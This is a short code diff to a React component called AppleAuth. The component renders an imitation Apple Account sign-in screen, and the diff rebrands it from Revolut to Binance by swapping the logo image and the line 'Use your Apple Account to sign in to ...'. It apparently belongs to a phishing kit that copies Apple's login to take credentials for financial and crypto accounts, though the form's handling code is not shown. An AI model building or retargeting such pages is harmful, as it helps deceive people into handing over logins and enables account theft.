@@ -131,10 +131,10 @@ export default function AppleAuth() {
                     {/* Authentication Logo - text */}
                     <div className='flex flex-col gap-[10px] justify-center text-center items-center w-full'>
                         <div className='w-16 h-16 rounded-xl p-1' style={{ boxShadow: '0 0 10px rgba(0, 0, 0, 0.2)' }}>
-                            <img src="https://assets.revolut.com/assets/brand/Revolut-Symbol-Black.svg" alt="Revolut Logo" />
+                            <img src="https://lh3.googleusercontent.com/89koR46wNEOHYkbF86ZlmxqGlPO5WQiMuWLDzir_AVDZ2yMRspD25KMvauINOtZxmlSH"  alt="Binance Logo" />
                         </div>
 
-                        <p className='text-md text-gray-800'>Use your Apple Account to sign in to Revolut.</p>
+                        <p className='text-md text-gray-800'>Use your Apple Account to sign in to Binance.</p>
                     </div>
 
                     {/* form */}
